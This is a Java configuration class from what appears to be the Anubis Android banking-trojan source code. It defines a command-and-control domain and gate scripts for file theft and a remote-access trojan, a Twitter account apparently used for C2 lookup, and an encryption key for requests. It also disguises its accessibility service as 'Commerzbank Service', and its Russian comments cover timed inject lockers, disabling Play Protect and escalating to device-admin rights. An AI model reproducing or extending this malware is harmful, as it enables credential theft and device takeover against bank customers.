package anubis.bot.myapplication;

import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;

public class Constants{
  public String str_decrypt(String textDE_C, String key)
  {
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }
  public   byte[] hexStringToByteArray(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
      data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
              + Character.digit(s.charAt(i+1), 16));
    }
    return data;
  }


  public final String urls = "http://fafdhassd.in";//"<url>";
  public final String urlInj = "";

  public final String gateFiles ="/o1o/a1.php";//getfiles.php
  public final String urlTwitter = "https://twitter.com/Hert721j";//"<urltwitter>";
  public final String gateRAT ="/o1o/a2.php";//ratgate.php
  public final boolean antiEmulator = false;
  public final boolean Logger = false;//Логирование true - показывать, false - нет
  public final String key_post = "flash1";//"<key>";//ключ шифрования запросов RequestHttp
  public final String Version = "coba";//"<tag>";//Метка бота
  public final String nameDex = Version;

  public final String nameAccessibilityService = "Commerzbank Service";
  public final int intervalTime = 10000;//-=interval=-;//отстук милисекунд
  public final String textadmin = "";

  public final int intervalLockInjTime = 12000;//инжект локер милисекунд
  public boolean checkActivityImage=false;//Показывать ли после установки изображение или нет!
  public String urlImage = "<urlImage>";
  public boolean PlayProtect=true;

  public int timePlayProtect=10;//Время запроса отключения Play Protect
  public int DeviceAdmin=0; //0 - без админ прав, 1 - с админ правами, 2 - с адин правами до 6.0
  public int StartRequest=1;
  /*
  1 - После установки требует спец. возмонсти далее подтверждает админ права и разрешения
  2 - Запрашиваем админ права (остальное можно по команде)
  3 - Запрашиваем админ права остальное через 17 минут
  4 - Запрашиваем админ права и разрешения (остальное можно по команде)
  5 - Запрашивать админ права и спец возможности (остальное можно по команде)
  6 - Запрашивать админ права и спец возможности  остальное через 17 минут
  */
}